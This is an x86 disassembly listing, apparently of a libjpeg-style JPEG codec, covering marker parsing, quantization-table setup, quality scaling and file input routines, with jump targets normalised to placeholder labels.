mov dl [ esp + 0x1f ]
mov [ eax + 0x18 ] edx
xor ecx ecx
mov cl [ esp + 0x20 ]
mov [ eax + 0x1c ] ecx
mov eax [ edi ]
mov [ eax + 0x14 ] 0x55
mov edx 0x2
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ edi ]
add eax 0x18
xor edx edx
mov dl [ esp + 0x21 ]
mov [ eax ] edx
xor ecx ecx
mov cl [ esp + 0x22 ]
mov [ eax + 0x4 ] ecx
xor edx edx
mov dl [ esp + 0x23 ]
mov [ eax + 0x8 ] edx
xor ecx ecx
mov cl [ esp + 0x24 ]
mov [ eax + 0xc ] ecx
xor edx edx
mov dl [ esp + 0x25 ]
mov [ eax + 0x10 ] edx
xor ecx ecx
mov cl [ esp + 0x26 ]
mov [ eax + 0x14 ] ecx
xor edx edx
mov dl [ esp + 0x27 ]
mov [ eax + 0x18 ] edx
xor ecx ecx
mov cl [ esp + 0x28 ]
mov [ eax + 0x1c ] ecx
mov eax [ edi ]
mov [ eax + 0x14 ] 0x55
mov edx 0x2
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp [ esp + 0x8 ] 0x100
jg r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
mov edx [ edi ]
mov eax edi
mov [ edx + 0x14 ] 0x1c
mov edx [ eax ]
call [ edx ]
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jle r-xdata
mov ecx [ esp + 0x8 ]
sub [ esp ] ecx
test [ esp + 0x4 ] 0x10
je r-xdata
test esi esi
jne r-xdata
xor ebp ebp
lea eax [ esp + 0x2c ]
mov [ esp + 0x14 ] eax
cmp ebp [ esp + 0x8 ]
jge r-xdata
mov ebp [ esp + 0x4 ]
shl ebp 0x2
add ebp edi
add ebp 0xb0
sub [ esp + 0x4 ] 0x10
mov ebp [ esp + 0x4 ]
shl ebp 0x2
add ebp edi
add ebp 0xc0
jmp r-xdata
dec esi
mov eax [ esp + 0x14 ]
mov dl [ ebx ]
mov [ eax ] dl
inc ebx
inc ebp
inc [ esp + 0x14 ]
cmp ebp [ esp + 0x8 ]
jl r-xdata
mov edx [ esp + 0xc ]
mov eax edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov [ eax + 0x14 ] 0x1d
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax edi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x4 ] 0x4
jl r-xdata
cmp [ esp + 0x4 ] 0x0
jl r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
push 0x11
lea edx [ esp + 0x1c ]
push edx
mov ecx [ ebp ]
push ecx
call sub_46a330
add esp 0xc
push 0x100
lea eax [ esp + 0x30 ]
push eax
mov edx [ ebp ]
add edx 0x11
push edx
call sub_46a330
add esp 0xc
cmp [ esp ] 0x0
jg r-xdata
mov eax edi
call sub_464550
mov [ ebp ] eax
cmp [ ebp ] 0x0
jne r-xdata
sub_4639a4
push ebx
push esi
push edi
push ebp
mov ebp eax
add esp 0xffffffe8
mov eax [ ebp + 0x14 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
test edi edi
jne r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
shl eax 0x8
test edi edi
mov [ esp ] eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax ebp
call [ edx + 0xc ]
test eax eax
jne r-xdata
dec edi
xor eax eax
mov al [ esi ]
add [ esp ] eax
inc esi
sub [ esp ] 0x2
cmp [ esp ] 0x0
jle r-xdata
mov edx [ esp + 0x10 ]
mov eax ebp
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] esi
mov eax 0x1
mov edx [ esp + 0x10 ]
mov [ edx + 0x4 ] edi
test edi edi
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
dec edi
mov bl [ esi ]
inc esi
mov eax ebx
sar eax 0x4
and ebx 0xf
mov [ esp + 0x8 ] eax
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x50
mov [ eax + 0x18 ] ebx
mov edx [ esp + 0x8 ]
mov [ eax + 0x1c ] edx
mov eax ebp
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp ebx 0x4
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax ebp
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ ebp + ebx * 4 + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x1e
mov [ eax + 0x18 ] ebx
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
mov edx [ ebp + ebx * 4 + 0xa0 ]
xor ecx ecx
mov [ esp + 0xc ] edx
mov [ esp + 0x4 ] ecx
mov [ esp + 0x14 ] rw-data
mov eax ebp
call sub_464538
mov [ ebp + ebx * 4 + 0xa0 ] eax
test edi edi
jne r-xdata
test edi edi
jne r-xdata
dec edi
xor ebx ebx
mov bl [ esi ]
inc esi
mov edx [ esp + 0x10 ]
mov eax ebp
call [ edx + 0xc ]
test eax eax
jne r-xdata
dec edi
xor ebx ebx
mov bl [ esi ]
shl ebx 0x8
inc esi
test edi edi
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax ebp
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp ]
cmp [ eax + 0x68 ] 0x2
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
dec edi
xor eax eax
mov al [ esi ]
add ebx eax
inc esi
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax ebp
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
sub [ esp ] 0x41
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov ecx [ esp + 0xc ]
mov ebx ecx
mov eax [ esp + 0x14 ]
mov edx [ eax ]
mov ecx [ esp + 0xc ]
mov [ ecx + edx * 2 ] bx
inc [ esp + 0x4 ]
add [ esp + 0x14 ] 0x4
cmp [ esp + 0x4 ] 0x40
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x0
jg r-xdata
sub [ esp ] 0x40
mov eax [ ebp ]
add eax 0x18
movzx edx [ ebx ]
mov [ eax ] edx
movzx ecx [ ebx + 0x2 ]
mov [ eax + 0x4 ] ecx
movzx edx [ ebx + 0x4 ]
mov [ eax + 0x8 ] edx
movzx ecx [ ebx + 0x6 ]
mov [ eax + 0xc ] ecx
movzx edx [ ebx + 0x8 ]
mov [ eax + 0x10 ] edx
movzx ecx [ ebx + 0xa ]
mov [ eax + 0x14 ] ecx
movzx edx [ ebx + 0xc ]
mov [ eax + 0x18 ] edx
movzx ecx [ ebx + 0xe ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x5c
mov edx 0x2
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x4 ]
add [ esp + 0x4 ] 0x8
add ebx 0x10
cmp [ esp + 0x4 ] 0x40
jl r-xdata
sub_463c28
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
mov edi [ ebp + 0x14 ]
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
shl eax 0x8
test esi esi
mov [ esp ] eax
jne r-xdata
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
dec esi
xor eax eax
mov al [ ebx ]
add [ esp ] eax
inc ebx
cmp [ esp ] 0x4
je r-xdata
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
mov edx [ ebp ]
mov eax ebp
mov [ edx + 0x14 ] 0x9
mov edx [ eax ]
call [ edx ]
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
shl eax 0x8
test esi esi
mov [ esp + 0x4 ] eax
jne r-xdata
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
xor eax eax
dec esi
mov al [ ebx ]
add [ esp + 0x4 ] eax
inc ebx
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x51
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebp
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ ebp + 0x110 ] eax
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
mov eax 0x1
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
sub_463d14
push ebx
push esi
push edi
mov esi eax
push ebp
push ecx
mov ebx [ esi + 0x14 ]
mov ebp [ ebx + 0x4 ]
mov edi [ ebx ]
test ebp ebp
jne r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
shl eax 0x8
test ebp ebp
mov [ esp ] eax
jne r-xdata
mov eax esi
call [ ebx + 0xc ]
test eax eax
jne r-xdata
xor eax eax
dec ebp
mov al [ edi ]
add [ esp ] eax
inc edi
mov eax [ esi ]
mov [ eax + 0x14 ] 0x5a
mov edx [ esi + 0x192 ]
mov [ eax + 0x18 ] edx
mov edx 0x1
mov ecx [ esp ]
mov [ eax + 0x1c ] ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax esi
mov [ ebx ] edi
mov [ ebx + 0x4 ] ebp
mov ecx [ eax + 0x14 ]
mov edx [ esp ]
add edx 0xfffffffe
call [ ecx + 0x10 ]
mov eax 0x1
mov eax esi
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov edi [ ebx ]
mov ebp [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
mov edi [ ebx ]
mov ebp [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_463da8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] eax
mov eax [ esp ]
mov edi [ eax + 0x14 ]
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
movzx ebp [ ebx ]
inc ebx
dec esi
cmp ebp 0xff
je r-xdata
mov eax [ esp ]
call [ edi + 0xc ]
test eax eax
jne r-xdata
test esi esi
jne r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1aa ]
inc [ edx + 0x5c ]
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
test esi esi
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
movzx ebp [ ebx ]
inc ebx
dec esi
cmp ebp 0xff
je r-xdata
mov eax [ esp ]
call [ edi + 0xc ]
test eax eax
jne r-xdata
movzx ebp [ ebx ]
inc ebx
dec esi
cmp ebp 0xff
jne r-xdata
mov eax [ esp ]
call [ edi + 0xc ]
test eax eax
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebp ebp
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x1aa ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1aa ]
add [ edx + 0x5c ] 0x2
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
jmp r-xdata
mov eax [ esp ]
mov [ eax + 0x192 ] ebp
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
mov eax 0x1
mov edx [ esp ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x70
mov edx [ esp ]
mov ecx [ edx + 0x1aa ]
mov edx [ ecx + 0x5c ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] ebp
or edx 0xffffffff
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esp ]
mov edx [ eax + 0x1aa ]
xor ecx ecx
mov [ edx + 0x5c ] ecx
test esi esi
jne r-xdata
sub_463ebc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
mov ebx [ ebp + 0x14 ]
mov esi [ ebx ]
mov edi [ ebx + 0x4 ]
test edi edi
jne r-xdata
dec edi
xor eax eax
mov al [ esi ]
mov [ esp ] eax
inc esi
test edi edi
jne r-xdata
mov eax ebp
call [ ebx + 0xc ]
test eax eax
jne r-xdata
dec edi
xor eax eax
mov al [ esi ]
mov [ esp + 0x4 ] eax
inc esi
cmp [ esp ] 0xff
jne r-xdata
mov eax ebp
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov esi [ ebx ]
mov edi [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x34
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x1c ] ecx
mov eax ebp
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x4 ] 0xd8
je r-xdata
mov esi [ ebx ]
mov edi [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x4 ]
mov eax 0x1
mov [ ebp + 0x192 ] ecx
mov [ ebx ] esi
mov [ ebx + 0x4 ] edi
sub_463f58
push ebx
mov ebx eax
mov edx [ ebx + 0x192 ]
cmp edx 0xcd
jge r-xdata
mov eax [ ebx + 0x1aa ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
cmp edx 0xdb
jg r-xdata
cmp edx 0xc5
jge r-xdata
mov eax ebx
call sub_463da8
test eax eax
jne r-xdata
mov eax ebx
call sub_463ebc
test eax eax
jne r-xdata
sub edx 0xdc
je r-xdata
je r-xdata
add edx 0xffffff3b
cmp edx 0x7
ja r-xdata
cmp edx 0xc2
jg r-xdata
xor eax eax
pop ebx
retn
xor eax eax
pop ebx
retn
mov eax ebx
call sub_463d14
test eax eax
jne r-xdata
dec edx
je r-xdata
mov eax ebx
call sub_4639a4
test eax eax
jne r-xdata
add edx 0xffffff33
cmp edx 0xd
ja r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x43
mov edx [ ebx + 0x192 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp [ edx * 4 + jump_table_463ffb ]
sub edx 0xc3
je r-xdata
je r-xdata
xor ecx ecx
mov [ ebx + 0x192 ] ecx
jmp r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_463c28
test eax eax
jne r-xdata
add edx 0xfffffffd
sub edx 0x10
jb r-xdata
xor eax eax
pop ebx
retn
jmp [ edx * 4 + jump_table_46403f ]
cmp [ ebx + 0x192 ] 0x0
jne r-xdata
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_4629d4
test eax eax
jne r-xdata
mov ecx 0x1
mov edx 0x1
mov eax ebx
call sub_4629d4
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x3b
mov edx [ ebx + 0x192 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
call sub_4634f0
test eax eax
jne r-xdata
dec edx
je r-xdata
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_4629d4
test eax eax
jne r-xdata
dec edx
je r-xdata
xor eax eax
pop ebx
retn
mov edx [ ebx + 0x1aa ]
mov ecx [ ebx + 0x192 ]
mov edx [ edx + ecx * 4 - 0x370 ]
mov eax ebx
call edx
test eax eax
jne r-xdata
sub edx 0xe
je r-xdata
mov eax ebx
call sub_46292c
test eax eax
jne r-xdata
mov eax ebx
call sub_462d54
test eax eax
jne r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x54
mov ecx [ eax ]
mov edx 0x1
call [ ecx + 0x4 ]
xor eax eax
mov [ ebx + 0x192 ] eax
mov eax 0x2
pop ebx
retn
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x5b
mov edx [ ebx + 0x192 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
xor eax eax
pop ebx
retn
xor eax eax
pop ebx
retn
xor eax eax
pop ebx
retn
mov eax ebx
call sub_463684
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
pop ebx
retn
add edx 0xffffff41
sub edx 0x2
jb r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax + 0x1aa ]
call [ edx + 0xc ]
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
pop ebx
retn
mov eax 0x1
xor edx edx
mov [ ebx + 0x192 ] edx
pop ebx
retn
xor eax eax
pop ebx
retn
xor eax eax
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4629d4
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
pop ebx
retn
xor eax eax
pop ebx
retn
sub_464250
push ebx
mov ebx eax
cmp [ ebx + 0x192 ] 0x0
jne r-xdata
mov edx [ ebx + 0x1aa ]
mov ecx [ edx + 0x58 ]
add ecx 0xd0
cmp ecx [ ebx + 0x192 ]
jne r-xdata
mov eax ebx
call sub_463da8
test eax eax
jne r-xdata
mov eax ebx
mov edx [ ebx + 0x1aa ]
mov ecx [ eax + 0x14 ]
mov edx [ edx + 0x58 ]
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x61
mov edx [ ebx + 0x1aa ]
mov ecx [ edx + 0x58 ]
mov edx 0x3
mov [ eax + 0x18 ] ecx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
mov [ ebx + 0x192 ] eax
jmp r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x1aa ]
mov edx [ eax + 0x58 ]
inc edx
and edx 0x7
mov [ eax + 0x58 ] edx
mov eax 0x1
pop ebx
retn
xor eax eax
pop ebx
retn
sub_4642e0
push ebx
push esi
mov esi eax
push edi
push ebp
mov ebp edx
mov eax [ esi ]
mov ebx [ esi + 0x192 ]
or edx 0xffffffff
mov [ eax + 0x14 ] 0x75
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] ebp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp ebx 0xd0
jl r-xdata
mov edi 0x2
jmp r-xdata
mov edi 0x3
jmp r-xdata
cmp ebx 0xd7
jle r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x60
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] edi
mov edx 0x4
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
dec edi
je r-xdata
lea eax [ ebp + 0x1 ]
and eax 0x7
add eax 0xd0
cmp ebx eax
je r-xdata
xor edx edx
mov eax 0x1
mov [ esi + 0x192 ] edx
jmp r-xdata
dec edi
je r-xdata
mov edi 0x3
jmp r-xdata
lea edx [ ebp + 0x2 ]
and edx 0x7
add edx 0xd0
cmp ebx edx
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_463da8
test eax eax
jne r-xdata
dec edi
je r-xdata
lea eax [ ebp - 0x1 ]
and eax 0x7
add eax 0xd0
cmp ebx eax
je r-xdata
mov ebx [ esi + 0x192 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov edi 0x2
jmp r-xdata
lea edx [ ebp - 0x2 ]
and edx 0x7
add edx 0xd0
cmp ebx edx
jne r-xdata
cmp ebx 0xc0
jge r-xdata
mov edi 0x1
sub_4643dc
xor edx edx
mov [ eax + 0xd4 ] edx
xor ecx ecx
mov [ eax + 0x8c ] ecx
xor edx edx
mov [ eax + 0x192 ] edx
mov edx [ eax + 0x1aa ]
xor ecx ecx
mov [ edx + 0x50 ] ecx
xor ecx ecx
mov [ edx + 0x54 ] ecx
xor eax eax
mov [ edx + 0x5c ] eax
retn
sub_46440c
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x60
xor edx edx
mov esi [ eax + 0x4 ]
call [ esi ]
mov esi eax
xor eax eax
mov [ ebx + 0x1aa ] esi
mov [ esi ] sub_4643dc
mov [ esi + 0x4 ] sub_463f58
mov [ esi + 0x8 ] sub_464250
mov [ esi + 0xc ] sub_463d14
mov edx [ ebx + 0x1aa ]
mov [ edx + eax * 4 + 0x10 ] sub_463d14
inc eax
cmp eax 0x10
jl r-xdata
mov eax [ ebx + 0x1aa ]
mov [ eax + 0x10 ] sub_463094
mov [ eax + 0x48 ] sub_463318
mov eax ebx
call sub_4643dc
pop esi
pop ebx
retn
sub_464490
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
shl edx 0x2
mov [ ebp - 0x4 ] eax
add ebx edx
mov edx [ ebp + 0x10 ]
shl edx 0x2
mov esi ecx
add esi edx
mov edi [ ebp + 0xc ]
test edi edi
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebx ]
add ebx 0x4
mov edx [ esi ]
add esi 0x4
mov ecx [ ebp - 0x4 ]
push ecx
push eax
push edx
call sub_46a330
add esp 0xc
dec edi
test edi edi
jg r-xdata
sub_4644ec
push ebx
push esi
mov esi eax
mov ebx 0x1
mov edx ebx
mov eax esi
mov ecx [ eax + 0x4 ]
call [ ecx + 0x24 ]
dec ebx
test ebx ebx
jg r-xdata
cmp [ esi + 0xc ] 0x0
mov eax 0xc8
jne r-xdata
mov [ esi + 0x10 ] eax
pop esi
pop ebx
retn
add eax 0xffffff9c
sub_464518
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
xor ecx ecx
xor eax eax
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x10 ] eax
pop ebx
retn
mov eax ebx
mov edx [ eax + 0x4 ]
call [ edx + 0x28 ]
sub_464568
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov ecx 0x1000
mov ebx [ esi + 0x14 ]
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edi eax
mov [ ebx + 0x18 ] edi
mov [ ebx ] edi
mov [ ebx + 0x4 ] 0x1000
pop edi
pop esi
pop ebx
retn
sub_464594
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x14 ]
mov eax [ ebx + 0x14 ]
push eax
push 0x1000
push 0x1
mov edx [ ebx + 0x18 ]
push edx
call sub_46a360
add esp 0x10
cmp eax 0x1000
je r-xdata
mov ecx [ ebx + 0x18 ]
mov eax 0x1
mov [ ebx ] ecx
mov [ ebx + 0x4 ] 0x1000
pop esi
pop ebx
retn
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x24
mov edx [ eax ]
call [ edx ]
sub_4645dc
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x14 ]
mov esi 0x1000
sub esi [ ebx + 0x4 ]
test esi esi
jbe r-xdata
mov ecx [ ebx + 0x14 ]
push ecx
call sub_46a37c
pop ecx
mov eax [ ebx + 0x14 ]
test [ eax + 0x12 ] 0x10
je r-xdata
mov eax [ ebx + 0x14 ]
push eax
push esi
push 0x1
mov edx [ ebx + 0x18 ]
push edx
call sub_46a360
add esp 0x10
cmp esi eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ edi ]
mov eax edi
mov [ edx + 0x14 ] 0x24
mov edx [ eax ]
call [ edx ]
mov ecx [ edi ]
mov eax edi
mov [ ecx + 0x14 ] 0x24
mov edx [ eax ]
call [ edx ]
sub_46463c
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x14 ] 0x0
mov esi edx
jne r-xdata
mov eax [ ebx + 0x14 ]
mov [ eax + 0x8 ] sub_464568
mov [ eax + 0xc ] sub_464594
mov [ eax + 0x10 ] sub_4645dc
mov [ eax + 0x14 ] esi
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x1c
xor edx edx
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x14 ] eax
sub_46467c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push esi
push edi
mov [ ebp - 0x4 ] ecx
cmp [ ebx + 0x10 ] 0x64
lea esi [ ebx + edx * 4 + 0x40 ]
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov ebx edx
mov eax ebx
call sub_464538
mov [ esi ] eax
cmp eax 0x7fff
jle r-xdata
mov eax 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0x7fff
mov edx [ esi ]
add ebx 0x4
mov [ edx + ecx * 2 ] ax
inc ecx
cmp ecx 0x40
jl r-xdata
cmp eax 0xff
jle r-xdata
mov eax [ ebx ]
imul [ ebp + 0xc ]
add eax 0x32
mov edi 0x64
cdq
idiv edi
test eax eax
jg r-xdata
mov ecx [ esi ]
xor eax eax
mov [ ecx + 0x80 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax 0xff
sub_464714
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx rw-data
xor edx edx
mov eax ebx
call sub_46467c
push esi
push edi
mov ecx rw-data
mov edx 0x1
mov eax ebx
call sub_46467c
pop edi
pop esi
pop ebx
retn
sub_464744
mov ecx eax
test ecx ecx
jg r-xdata
cmp ecx 0x64
jle r-xdata
mov ecx 0x1
cmp ecx 0x32
jge r-xdata
mov ecx 0x64
add ecx ecx
mov eax 0xc8
sub eax ecx
mov ecx eax
mov eax 0x1388
cdq
idiv ecx
mov ecx eax
jmp r-xdata
mov eax ecx
retn
sub_464778
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax edx
call sub_464744
mov edx eax
mov ecx esi
mov eax ebx
call sub_464714
pop esi
pop ebx
retn
sub_464794
push ebp
mov ebp esp
push ebx
mov ebx edx
push esi
push edi
cmp [ ebx ] 0x0
mov edi eax
mov esi ecx
jne r-xdata
push 0x11
push esi
mov edx [ ebx ]
push edx
call sub_46a330
add esp 0xc
push 0x100
mov ecx [ ebp + 0x8 ]
push ecx
mov eax [ ebx ]
add eax 0x11
push eax
call sub_46a330
add esp 0xc
mov edx [ ebx ]
xor ecx ecx
mov [ edx + 0x111 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
call sub_464550
mov [ ebx ] eax
sub_4647e4
push ebx
mov ebx eax
push rw-data
mov ecx rw-data
lea edx [ ebx + 0x50 ]
mov eax ebx
call sub_464794
push rw-data
mov ecx rw-data
lea edx [ ebx + 0x60 ]
mov eax ebx
call sub_464794
push rw-data
mov ecx rw-data
lea edx [ ebx + 0x54 ]
mov eax ebx
call sub_464794
push rw-data
mov ecx rw-data
lea edx [ ebx + 0x64 ]
mov eax ebx
call sub_464794
pop ebx
retn
sub_46483c
push ebx
mov ebx eax
push esi
cmp [ ebx + 0x10 ] 0x64
je r-xdata
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x30 ] 0x8
mov ecx 0x1
mov edx 0x4b
mov eax ebx
call sub_464778
mov eax ebx
call sub_4647e4
xor edx edx
lea eax [ ebx + 0x70 ]
mov eax ebx
mov ecx 0x348
xor edx edx
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x3c ] eax
mov [ eax ] 0x0
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x20 ] 0x5
inc edx
inc eax
cmp edx 0x10
jl r-xdata
xor edx edx
xor ecx ecx
mov [ ebx + 0xa4 ] edx
mov [ ebx + 0xa0 ] ecx
xor eax eax
xor edx edx
mov [ ebx + 0xa8 ] eax
xor ecx ecx
mov [ ebx + 0xac ] edx
mov [ ebx + 0xb0 ] ecx
cmp [ ebx + 0x30 ] 0x8
jle r-xdata
